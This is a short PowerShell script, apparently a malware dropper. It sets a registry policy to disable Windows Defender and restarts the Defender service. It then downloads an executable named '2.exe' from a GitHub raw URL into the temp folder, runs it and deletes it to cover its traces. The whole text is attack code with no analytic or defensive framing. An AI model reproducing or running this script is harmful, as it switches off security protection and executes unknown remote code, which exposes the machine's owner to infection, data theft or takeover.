$defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
New-Item -Path $defenderPath -Force | Out-Null
Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -Force
Restart-Service WinDefend -Force -ErrorAction SilentlyContinue
$url = "https://raw.githubusercontent.com/Drenote/123/refs/heads/main/2.exe"
$outPath = "$env:TEMP\2.exe"
Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
Start-Process -FilePath $outPath -Wait
Remove-Item $outPath -Force -ErrorAction SilentlyContinue
